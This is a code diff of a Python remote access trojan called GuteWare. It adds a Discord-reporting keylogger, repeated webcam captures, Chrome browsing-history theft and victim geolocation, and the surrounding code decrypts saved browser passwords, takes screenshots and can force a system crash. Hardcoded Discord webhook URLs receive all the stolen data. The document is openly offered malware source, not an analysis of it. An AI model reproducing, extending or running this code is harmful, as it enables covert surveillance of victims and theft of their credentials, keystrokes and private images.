@@ -10,51 +10,59 @@ import time
 clear = lambda: os.system('cls')
 
 print("Installing python libraries, please wait...")
-time.sleep(2)
-
+clear()
 os.system("pip install requests")
 clear()
-time.sleep(.1)
 os.system("pip install psutil")
 clear()
-time.sleep(.1)
 os.system("pip install coloredlogs")
 clear()
-time.sleep(.1)
 os.system("pip install dhooks")
 clear()
-time.sleep(.1)
 os.system("pip install pyautogui")
 clear()
-time.sleep(.1)
 os.system("pip install keyboard")
 clear()
-time.sleep(.1)
 os.system("pip install pyHook")
 clear()
-time.sleep(.1)
 os.system("pip install httplib2")
 clear()
-time.sleep(.1)
 os.system("pip install opencv-python")
 clear()
+os.system("pip install discord_webhook")
+clear()
+os.system("pip install httpx")
+clear()
+
+def libs():
+    print("remember to add libs retard")
+
+libs()
 
 print("Library installation finished, continuing.")
 
-from ipaddress import ip_address
-import ipaddress, threading, subprocess, requests, re, ctypes, logging, hashlib, time, secrets, random, json, socket, sqlite3, shutil, base64, win32gui, win32gui, time,httplib2, sys, psutil
+red = 0xFF0000
+blue = 0x0000FF
+green = 0x00FF00
+purple = 0xFF00FF
+yellow = 0xFFFF00
+white = 0xFFFFFF
+black = 0x000000
+grey = 0x808080
+orange = 0xFFA500
+pink = 0xFFC0CB
+teal = 0x367588
+brown = 0x964B00
+maroon = 0x2D0000
+
+import threading, subprocess, requests, re, ctypes, json, sqlite3, shutil, base64, win32gui, win32gui, time, httplib2, sys, psutil
 import pyautogui, win32crypt
 from dhooks import Webhook, File, Embed
-from random import randint
-from colorama import Fore
 from threading import Timer
-from datetime import datetime
 from urllib.request import Request, urlopen
-from colorama import Fore
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 from ctypes import *
-from time import sleep
 from threading import Timer 
 from multiprocessing import Process
 from subprocess import PIPE
@@ -63,28 +71,28 @@ import pygame
 import pygame.camera
 clear()
 from os import system
-import time
 import urllib.request as urllib2
 import platform
+import ntpath
+import asyncio
+from base64 import b64decode
+from json import loads
+from win32crypt import CryptUnprotectData
+from subprocess import Popen
+from re import findall
+import keyboard
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import httpx
 
 os.system('color')
-
-
-#  ██████╗██╗   ██╗████████╗    ██╗   ██╗██████╗ ██╗     ███████╗
-# ██╔════╝██║   ██║╚══██╔══╝    ██║   ██║██╔══██╗██║     ██╔════╝
-# ██║     ██║   ██║   ██║       ██║   ██║██████╔╝██║     ███████╗
-# ██║     ██║   ██║   ██║       ██║   ██║██╔══██╗██║     ╚════██║
-# ╚██████╗╚██████╔╝   ██║       ╚██████╔╝██║  ██║███████╗███████║
-#  ╚═════╝ ╚═════╝    ╚═╝        ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
+OperatingSystem = platform.system()
+OSRelease = platform.release()
+OSVersion = platform.version()
+Version = "2.1"
+Creator = "Gute Nacht"
+link = "https://github.com/dacianfan/GuteWare-python-rat"
 
 # //////////////////////////////////////////////////////////////
-
-# IP Grabbing Site
-jlkfjgf = "https://api"
-flkgjdfg = ".ipify"
-sdkfjsd = ".org"
-
-# Pc Info Webhook
 
 # (set your gist here)
 
@@ -93,14 +101,56 @@ sdkfjsd = ".org"
 # after you have your link, paste it (it should look something like this: https://gist.github.com/test/713670965c4c68010ec4b5c034c2d72d)
 # then, add /raw to the end to make it look like this: https://gist.github.com/test/713670965c4c68010ec4b5c034c2d72d/raw
 
+
+
+# ██╗   ██╗███████╗███████╗██████╗     ██╗███╗   ██╗██████╗ ██╗   ██╗████████╗   
+# ██║   ██║██╔════╝██╔════╝██╔══██╗    ██║████╗  ██║██╔══██╗██║   ██║╚══██╔══╝██╗
+# ██║   ██║███████╗█████╗  ██████╔╝    ██║██╔██╗ ██║██████╔╝██║   ██║   ██║   ╚═╝
+# ██║   ██║╚════██║██╔══╝  ██╔══██╗    ██║██║╚██╗██║██╔═══╝ ██║   ██║   ██║   ██╗
+# ╚██████╔╝███████║███████╗██║  ██║    ██║██║ ╚████║██║     ╚██████╔╝   ██║   ╚═╝
+#  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝    ╚═╝       
+# ████████╗██╗  ██╗██╗███████╗    ██╗███████╗    ████████╗██╗  ██╗███████╗     ██████╗ ███╗   ██╗██╗  ██╗   ██╗
+# ╚══██╔══╝██║  ██║██║██╔════╝    ██║██╔════╝    ╚══██╔══╝██║  ██║██╔════╝    ██╔═══██╗████╗  ██║██║  ╚██╗ ██╔╝
+#    ██║   ███████║██║███████╗    ██║███████╗       ██║   ███████║█████╗      ██║   ██║██╔██╗ ██║██║   ╚████╔╝ 
+#    ██║   ██╔══██║██║╚════██║    ██║╚════██║       ██║   ██╔══██║██╔══╝      ██║   ██║██║╚██╗██║██║    ╚██╔╝  
+#    ██║   ██║  ██║██║███████║    ██║███████║       ██║   ██║  ██║███████╗    ╚██████╔╝██║ ╚████║███████╗██║   
+#    ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝   
+# ████████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ██╗   ██╗ ██████╗ ██╗   ██╗    ███████╗██╗  ██╗ ██████╗ ██╗   ██╗██╗     ██████╗ 
+# ╚══██╔══╝██║  ██║██║████╗  ██║██╔════╝     ╚██╗ ██╔╝██╔═══██╗██║   ██║    ██╔════╝██║  ██║██╔═══██╗██║   ██║██║     ██╔══██╗
+#    ██║   ███████║██║██╔██╗ ██║██║  ███╗     ╚████╔╝ ██║   ██║██║   ██║    ███████╗███████║██║   ██║██║   ██║██║     ██║  ██║
+#    ██║   ██╔══██║██║██║╚██╗██║██║   ██║      ╚██╔╝  ██║   ██║██║   ██║    ╚════██║██╔══██║██║   ██║██║   ██║██║     ██║  ██║
+#    ██║   ██║  ██║██║██║ ╚████║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝    ███████║██║  ██║╚██████╔╝╚██████╔╝███████╗██████╔╝
+#    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ 
+# ██████╗ ███████╗    ███████╗██████╗ ██╗████████╗██╗███╗   ██╗ ██████╗    
+# ██╔══██╗██╔════╝    ██╔════╝██╔══██╗██║╚══██╔══╝██║████╗  ██║██╔════╝    
+# ██████╔╝█████╗      █████╗  ██║  ██║██║   ██║   ██║██╔██╗ ██║██║  ███╗   
+# ██╔══██╗██╔══╝      ██╔══╝  ██║  ██║██║   ██║   ██║██║╚██╗██║██║   ██║   
+# ██████╔╝███████╗    ███████╗██████╔╝██║   ██║   ██║██║ ╚████║╚██████╔╝██╗
+# ╚═════╝ ╚══════╝    ╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝
+
+# editing anything else may break something.
+
 data = requests.get(
-    'set your gist here')
+    'https://gist.github.com/dacianfan/71345092bc4c68010ec4b5c034c2d72d/raw')
 for line in data:
     linedecoded = line.decode()
-    webhook = Webhook(linedecoded)
+    webhook = Webhook("https://discord.com/api/webhooks/999066463463809074/maBlPRJAS-K9Ya8rjCYEYAg19V5rVhdo39ZNSAej1KymuKo-l62cY4Rm01I9_jPqR8ra")
 
-OperatingSystem = platform.system()
-OSVersion = platform.release()
+# SET A NEW WEBHOOK FOR YOUR KEY LOGGER
+# (I'd make it in a new channel because it kinda floods the channel)
+keyloghook = "https://discord.com/api/webhooks/1003754378894782574/BzQ_P_pgqsLo6CuqcalKBBdiF3BIpSU6SPcKEKozzGYPlHGP4fr5U-HZWasxmJ79ne60"
+ReportDelay = 60 # time between reports (seconds)
+
+# Set your webhook for webcam recording
+# (I'd make it in a new channel because it kinda floods the channel)
+    
+camhook = Webhook("https://discord.com/api/webhooks/1003760040013996092/Nprl9Zo0ba3fduBLt08CLDK1fb1L74pAQVkMu8HEwAhB6PQ4y45PKD4VcFpb5_huIuw4")
+
+# Select an embed colour
+# Options: red, blue, green, purple, yellow, white, black, grey, orange, pink, teal, brown, maroon
+
+EmbedColour = red
+femboymode = False # True or False, True for femboy False for regular and stupid
 
 # ██╗██████╗      ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
 # ██║██╔══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
@@ -111,8 +161,23 @@ OSVersion = platform.release()
                                                                         
 # ///////////////////////////////////////////////////////////////////////
 
-ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-
+req = httpx.get("https://ipinfo.io/json")
+if req.status_code == 200:
+            data = req.json()
+            ip = data.get('ip')
+            city = data.get('city')
+            country = data.get('country')
+            region = data.get('region')
+            loc = data.get('loc')
+            hostname = data.get('hostname')
+            postal = data.get('postal')
+            org = data.get('org')
+            googlemaps = "<https://www.google.com/maps/search/google+map++" + loc + ">"
+            
+if country == "US":
+    RegionOrState = "State"
+else:
+    RegionOrState = "Region"
 
 # ██████╗  ██████╗    ██╗███╗   ██╗███████╗ ██████╗     ███████╗███████╗███╗   ██╗██████╗ ██╗███╗   ██╗ ██████╗ 
 # ██╔══██╗██╔════╝    ██║████╗  ██║██╔════╝██╔═══██╗    ██╔════╝██╔════╝████╗  ██║██╔══██╗██║████╗  ██║██╔════╝ 
@@ -127,45 +192,52 @@ ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
 loginname = os.getlogin()
 hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
 
-icon = "https://cdn.discordapp.com/attachments/920469526158639137/995553408499077210/unknown.png"
+if femboymode == True:
+    icon = "https://cdn.discordapp.com/attachments/920469526158639137/1003856313031348335/cherry-blossom_1f338.png" 
+    author = "Guwute Nacht"
+    EmbedColour = pink
+else:
+    icon = "https://cdn.discordapp.com/attachments/920469526158639137/995553408499077210/unknown.png"
+    author = "Gute Nacht"
 
 PC_INFO_EMBED = Embed(
     title=f"New request from {loginname}",
-    color=0xFF0000,
+    color=EmbedColour,
     timestamp ='now'
 )
 
-PC_INFO_EMBED.set_author(name="Gute Nacht", icon_url=icon)
-PC_INFO_EMBED.add_field(name="\u2063", value = f"**IP Address**: `{ip}` \n**HWID**: `{hwid}` \n**OS**: `{OperatingSystem} {OSVersion}`")
-PC_INFO_EMBED.set_footer(text="https://github.com/dacianfan/GuteWare-python-rat")
+PC_INFO_EMBED.set_author(name=author, icon_url=icon)
+PC_INFO_EMBED.add_field(name="\u2063", value = f"**IP Address**: `{ip}` \n**ISP**: `{org}` \n**Hostname**: `{hostname}` \n**City**: `{city}, {postal}` \n**Country**: `{country}` \n**{RegionOrState}**: `{region}` \n **Google Maps**: https://www.google.com/maps/search/google+map++26.6644,-80.1741 \n \n**HWID**: `{hwid}` \n**OS**: `{OperatingSystem} {OSRelease} ({OSVersion})`")
+PC_INFO_EMBED.set_footer(text=f"{link}")
 
 CAM_ERROR_EMBED = Embed(
     title=f"Failed to take screenshot of {loginname}'s camera :(",
-    color=0xFF0000,
+    color=EmbedColour,
     timestamp ='now'
 )
 
-CAM_ERROR_EMBED.set_author(name="Gute Nacht", icon_url=icon)
+CAM_ERROR_EMBED.set_author(name=author, icon_url=icon)
 CAM_ERROR_EMBED.add_field(name="\u2063", value = f"**Reason**: User has no webcam :(")
-CAM_ERROR_EMBED.set_footer(text="https://github.com/dacianfan/GuteWare-python-rat")
+CAM_ERROR_EMBED.set_footer(text=f"{link}")
 webhook.send(embed=PC_INFO_EMBED)
 
 Credit = Embed(
     title=f"Credits:",
-    color=0xFF0000,
+    color=EmbedColour,
 )
 
-Credit.set_author(name="Gute Nacht", icon_url=icon)
-Credit.add_field(name="\u2063", value = f"You are using GuteWare 2.0! \nGet it at https://github.com/dacianfan/GuteWare-python-rat \n\n<3 - Gute Nacht")
-Credit.set_footer(text="https://github.com/dacianfan/GuteWare-python-rat")
+Credit.set_author(name=author, icon_url=icon)
+Credit.add_field(name="\u2063", value = f"You are using GuteWare {Version}! \nGet it at https://github.com/dacianfan/GuteWare-python-rat \n\n<3 - Gute Nacht")
+Credit.set_footer(text=f"{link}")
+
+
 
 #  ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗    ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ ███████╗
 # ██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔════╝
 # ██║     ███████║██████╔╝██║   ██║██╔████╔██║█████╗      ██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║███████╗
 # ██║     ██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝      ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║╚════██║
 # ╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗    ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝███████║
-#  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
-                                                                                                                                   
+#  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝                                                                              
 # //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 def chrome_date_and_time(chrome_data):
@@ -254,8 +326,47 @@ def main():
   
 if __name__ == "__main__":
     main()
+# ///////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+def grabHistory(self):
+    f = open("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\ChromeHistory.txt", 'w', encoding="cp437", errors='ignore')
 
+    def extract_search_history(db_cursor):
+        db_cursor.execute('SELECT term FROM keyword_search_terms')
+        search_terms = ""
+        for item in db_cursor.fetchall():
+            if item[0] != "":
+                search_terms += f"{item[0]}\n"
+        return search_terms
+
+    def extract_web_history(db_cursor):
+        web = ""
+        db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
+        for item in db_cursor.fetchall():
+            web += f"Title: {item[0]}\nUrl: {item[1]}\nLast Time Visit: {self.convert_time(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
+        return web
+
+    for prof in os.listdir(self.chrome_user_data):
+        if re.match(self.chrome_reg, prof):
+            login_db = ntpath.join(self.chrome_user_data, prof, 'History')
+            login = self.create_temp_file()
+
+            shutil.copy2(login_db, login)
+            conn = sqlite3.connect(login)
+            cursor = conn.cursor()
+
+            search_history = extract_search_history(cursor)
+            web_history = extract_web_history(cursor)
+
+            f.write(f"{' '*17}Search History\n{'-'*50}\n{search_history}\n{' '*17}\n\nWeb History\n{'-'*50}\n{web_history}")
+            history_file = File("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\ChromeHistory.txt", name = "history.txt")
+            webhook.send("", file = history_file)
+            
+            cursor.close()
+            conn.close()
+            os.remove(login)
+    f.close()
+    
 # ███████╗██╗██╗     ███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
 # ██╔════╝██║██║     ██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
 # █████╗  ██║██║     █████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝██║██╔██╗ ██║██║  ███╗
@@ -326,10 +437,10 @@ else:
 myScreenshot = pyautogui.screenshot()
 myScreenshot.save("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png")
 
+
 screenshot = File("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png", name = "Screenshot.png")
 webhook.send("", file = screenshot)
 os.remove("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png")
-
 
 # ██╗    ██╗███████╗██████╗  ██████╗ █████╗ ███╗   ███╗    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗███████╗██╗  ██╗ ██████╗ ████████╗
 # ██║    ██║██╔════╝██╔══██╗██╔════╝██╔══██╗████╗ ████║    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
@@ -340,26 +451,65 @@ os.remove("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot
 
 # //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-pygame.camera.init()
+camhook.username = "Camera Recorder"
+camhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003849094374117396/download_4.png"
+
+def FirstCameraSS():
+    pygame.camera.init()
   
-camlist = pygame.camera.list_cameras()
+    camlist = pygame.camera.list_cameras()
   
-if camlist:
+    if camlist:
+        cam = pygame.camera.Camera(camlist[0], (640, 480))
   
-    cam = pygame.camera.Camera(camlist[0], (640, 480))
+        cam.start()
+        time.sleep(1)
   
-    cam.start()
-    time.sleep(1)
+        image = cam.get_image()
+
+        timedata = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
+        
+        pygame.image.save(image, "C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
+        webcamss = File("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg", name = "WebcamScreenshot.jpg")
+        webhook.send(file=webcamss)
+        time.sleep(1)
+        os.remove("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
+    else:
+        webhook.send(embed=CAM_ERROR_EMBED)
+
+FirstCameraSS()
+
+webhook.send(embed=Credit)
+
+def camss():
+    working = bool()
+    pygame.camera.init()
   
-    image = cam.get_image()
+    camlist = pygame.camera.list_cameras()
   
-    pygame.image.save(image, "C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
-    webcamss = File("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg", name = "WebcamScreenshot.jpg")
-    webhook.send("", file=webcamss)
-    time.sleep(1)
-    os.remove("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
-else:
-    webhook.send(embed=CAM_ERROR_EMBED)
+    if camlist:
+        
+        working = True
+    
+    if working == True:
+        cam = pygame.camera.Camera(camlist[0], (640, 480))
+  
+        cam.start()
+        time.sleep(1)
+  
+        image = cam.get_image()
+
+        timedata = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
+        
+        pygame.image.save(image, "C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
+        webcamss = File("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg", name = "WebcamScreenshot.jpg")
+        camhook.send(f"New Screenshot from {loginname} at {timedata}", file=webcamss)
+        time.sleep(1)
+        os.remove("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
+    else:
+        working = False
+
+camss()
 
 
 # ███████╗ ██████╗ █████╗ ██████╗ ███████╗███████╗
@@ -373,7 +523,6 @@ else:
 def dl_jpg(url, file_path, file_name):
     full_path = file_path + name + '.png'
     urllib2.urlretrieve(url, full_path)
-    print("Sent successfully")
     
 url = "image url"
 name = "image name"
@@ -385,15 +534,92 @@ def bsod():
     res = ctypes.c_ulong()
     ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
     if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
-        print("BSOD Successful")
+        print("Successful")
     else:
-        pass
+        print("Failed")
 
 # How to enable: 
-# Remove all the comments or # from everything below this
+# Remove all the comments or # from #scares() below this
+# IF YOU ENABLE SCARES, ANYTHING BELOW WILL NOT WORK.
 
-#dl_jpg(url, "image_", name)
-#ctypes.windll.user32.SystemParametersInfoW(20, 0, cwd + "\image_" + name + ".png", 0)
-#bsod()
+def scares():
+    dl_jpg(url, "image_", name)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, cwd + "\image_" + name + ".png", 0)
+    time.sleep(2)
+    bsod()
 
-webhook.send(embed=Credit)
+#scares()
+
+# Keylogger by https://github.com/3ct0s/discord-keylogger
+
+class Keylogger: 
+    def __init__(self, interval, report_method="webhook"):
+        now = datetime.now()
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.username = os.getlogin()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "\n"
+            elif name == "decimal":
+                name = "."
+            elif name == "[TAB]":
+                name = ""
+            elif name == "[SHIFT]":
+                name = ""
+            elif name == "[ESC]":
+                name = "\n"
+            elif name == "[ALT]":
+                name = ""
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def report_to_webhook(self):
+        camss()
+        flag = False
+        webhook = DiscordWebhook(url=keyloghook)
+        if len(self.log) > 2000:
+            flag = True
+            path = os.environ["temp"] + "\\report.txt"
+            with open(path, 'w+') as file:
+                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
+                file.write(self.log)
+            with open(path, 'rb') as f:
+                webhook.add_file(file=f.read(), filename='report.txt')
+        else:
+            webhook.username = "Keylog Reporter"
+            webhook.avatar_url = "https://cdn.discordapp.com/attachments/920469526158639137/1003849100078350416/download_3.png"
+            embed = DiscordEmbed(title=f"Keylogger Report From {self.username} | Time: {self.end_dt}", description=self.log)
+            webhook.add_embed(embed)    
+        webhook.execute()
+        if flag:
+            os.remove(path)
+
+    def report(self):
+        if self.log:
+            if self.report_method == "webhook":
+                self.report_to_webhook()    
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
+    
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=ReportDelay, report_method="webhook")    
+    keylogger.start()
